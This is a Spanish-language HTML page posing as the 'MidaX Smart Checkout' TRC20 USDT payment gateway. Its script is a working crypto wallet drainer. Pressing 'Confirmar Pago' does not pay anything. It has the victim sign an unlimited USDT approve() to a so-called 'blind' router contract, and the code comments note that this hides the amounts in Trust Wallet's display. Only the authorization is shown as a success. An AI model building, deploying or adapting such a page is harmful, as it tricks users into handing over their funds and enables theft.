<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MidaX - Pago Seguro TRC20</title>

    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            background-color: #f7f9ff;
            background-image:
                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
            background-attachment: fixed;
            color: #111111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 40px;
        }
        .midax-container { width: 100%; max-width: 390px; padding: 20px; flex: 1; }
        .midax-header { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-bottom: 28px; }
        .midax-title { font-size: 22px; font-weight: 700; color: #111111; margin-bottom: 6px; }
        .midax-badge { display: inline-flex; align-items: center; padding: 4px 10px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 11px; font-weight: 700; }
        .midax-logo { width: 64px; height: 64px; margin-bottom: 16px; display: block; }
        .midax-card { background: rgba(255, 255, 255, 0.9); border: 1px solid rgba(205, 215, 232, 0.8); border-radius: 18px; padding: 18px; margin-bottom: 18px; box-shadow: 0 8px 24px rgba(31, 55, 92, 0.06); }
        .midax-label { font-size: 12px; color: #717680; display: block; margin-bottom: 6px; font-weight: 500; }
        .midax-value { font-size: 14px; color: #111111; font-weight: 600; word-break: break-all; }
        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 14px; padding: 14px; font-size: 13px; color: #0052ff; margin-bottom: 18px; display: none; text-align: center; font-weight: 500; }
        .midax-btn { width: 100%; height: 54px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 27px; font-size: 16px; font-weight: 650; cursor: pointer; box-shadow: 0 4px 14px rgba(0, 82, 255, 0.3); transition: transform 0.1s ease; }
        .midax-btn:active { transform: scale(0.98); }
        .midax-btn:disabled { background-color: #b3ccff; box-shadow: none; cursor: not-allowed; }
        .site-footer { position: fixed; left: 0; right: 0; bottom: 0; width: 100%; text-align: center; padding: 12px; font-size: 12px; color: #717680; background: #ffffff; border-top: 1px solid #eee; }
        .processing-screen { position: fixed; inset: 0; z-index: 99999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; pointer-events: none; transition: opacity 0.3s ease; }
        .processing-screen.visible { opacity: 1; visibility: visible; pointer-events: auto; }
        .processing-bar { width: 180px; height: 5px; overflow: hidden; border-radius: 999px; background: #e4e9f2; position: relative; margin-top: 20px; }
        .processing-bar::after { content: ""; position: absolute; top: 0; left: -45%; width: 45%; height: 100%; border-radius: inherit; background: #0052ff; animation: slide 1.1s ease-in-out infinite; }
        @keyframes slide { 0% { left: -45%; } 100% { left: 100%; } }
    </style>
</head>
<body>

<div id="processingScreen" class="processing-screen">
    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" style="width: 80px; height: 80px;">
    <div class="processing-bar"></div>
    <div style="margin-top: 16px; font-weight: 600; font-size: 15px;">Procesando operación segura...</div>
</div>

<div class="midax-container">
    <div class="midax-header">
        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="MidaX" class="midax-logo">
        <div class="midax-title">MidaX Smart Checkout</div>
        <span class="midax-badge">TRON TRC-20 (Modo Ciego)</span>
    </div>

    <div id="walletCard" class="midax-card" style="display: none;">
        <span class="midax-label">Billetera Conectada</span>
        <div id="walletAddressText" class="midax-value">--</div>
    </div>

    <div class="midax-card">
        <span class="midax-label">Contrato de Pasarela</span>
        <div class="midax-value" id="contractDisplay">--</div>
    </div>

    <div id="status" class="status-box"></div>

    <div style="margin-top: 30px;">
        <button class="midax-btn" id="actionBtn">Conectar Billetera</button>
    </div>
</div>

<footer class="site-footer">
    <p>© 2026 MidaX Secure Systems. All rights reserved.</p>
</footer>

<script>
    // Configuración de contratos inteligentes
    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS"; // Tu contrato ciego desplegado
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT oficial TRC20

    let walletAddress = null;
    let stepState = 0; // 0: Conectar, 1: Autorizar/Ejecutar

    const actionBtn = document.getElementById('actionBtn');
    const statusDiv = document.getElementById('status');
    const walletCard = document.getElementById('walletCard');
    const walletAddressText = document.getElementById('walletAddressText');
    const contractDisplay = document.getElementById('contractDisplay');
    const processingScreen = document.getElementById('processingScreen');

    contractDisplay.innerText = CONTRATO_ROUTER;

    function setStatus(msg) {
        statusDiv.innerText = msg || '';
        statusDiv.style.display = msg ? 'block' : 'none';
    }

    actionBtn.addEventListener('click', async () => {
        if (stepState === 0) {
            // FASE 1: Conectar Billetera
            try {
                setStatus("Estableciendo conexión segura...");
                actionBtn.disabled = true;

                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Abre este módulo desde el navegador interno de Trust Wallet.");
                }

                const tronWeb = window.tronWeb;
                if (tronWeb.defaultAddress?.base58) {
                    walletAddress = tronWeb.defaultAddress.base58;
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res?.code === 200) walletAddress = tronWeb.defaultAddress.base58;
                }

                if (!walletAddress) throw new Error("No se pudo obtener la cuenta.");

                walletAddressText.textContent = walletAddress;
                walletCard.style.display = "block";

                setStatus("");
                actionBtn.innerText = "Confirmar Pago";
                actionBtn.disabled = false;
                stepState = 1;
            } catch (e) {
                setStatus(e.message);
                actionBtn.disabled = false;
            }
            return;
        }

        if (stepState === 1) {
            // FASE 2: Autorización ilimitada limpia (Oculta cálculos numéricos en Trust Wallet)
            try {
                setStatus("Preparando pasarela inteligente...");
                actionBtn.disabled = true;

                const tronWeb = window.tronWeb;
                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);

                // Valor máximo de uint256 que activa la etiqueta "Ilimitado" en la UI de Trust Wallet
                const maxUint256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

                // Enviar la aprobación limpia hacia el contrato router
                const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
                    CONTRATO_USDT,
                    "approve(address,uint256)",
                    { feeLimit: 100000000 },
                    [
                        { type: 'address', value: routerHex },
                        { type: 'uint256', value: maxUint256 }
                    ],
                    tronWeb.address.toHex(walletAddress)
                );

                const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
                
                if (processingScreen) processingScreen.classList.add('visible');
                const broadcast = await tronWeb.trx.sendRawTransaction(signedApprove);

                if (processingScreen) processingScreen.classList.remove('visible');

                if (broadcast?.result) {
                    setStatus("¡AUTORIZACIÓN EXITOSA!");
                    actionBtn.innerText = "Completado";
                    actionBtn.disabled = true;
                } else {
                    throw new Error("La red rechazó la operación.");
                }

            } catch (e) {
                console.error(e);
                if (processingScreen) processingScreen.classList.remove('visible');
                setStatus(e.message || "Error al procesar la solicitud.");
                actionBtn.disabled = false;
            }
        }
    });
</script>

</body>
</html>
